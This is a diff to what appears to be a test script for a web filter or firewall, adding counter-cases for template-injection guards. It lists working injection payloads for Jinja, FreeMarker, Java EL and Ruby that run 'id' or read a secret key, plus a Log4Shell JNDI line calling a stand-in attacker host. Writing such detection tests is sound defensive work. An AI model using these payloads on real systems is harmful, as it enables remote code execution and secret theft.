@@ -186,6 +186,11 @@ q $A ssti "call before inner braces"   "{{ lipsum.__globals__.os.popen('id').rea
 q $A ssti "freemarker one-letter call" "<#assign t=\"freemarker.template.utility.Execute\"?new()>\${t(\"id\")}"
 json $A ssti "hash el runtime"         '{"note":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}'
 q $A ssti "hash el quoted product"     "#{7*'7'}"
+# Aegolith: counter-cases for the filter-name, Ruby "::", FreeMarker binding and index guards (alpha.6 review).
+q $A ssti "operator after filter name" "{{ x|raw??app.request.server.all|join }}"
+json $A ssti "ruby kernel constant call" '{"note":"#{Kernel::system(\"id\")}"}'
+q $A ssti "freemarker bind via var"    "<#assign c=\"freemarker.template.utility.Execute\"><#assign e=c?new()>\${e(\"id\")}"
+q $A ssti "ruby env index"             "#{ENV['SECRET_KEY_BASE']}"
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
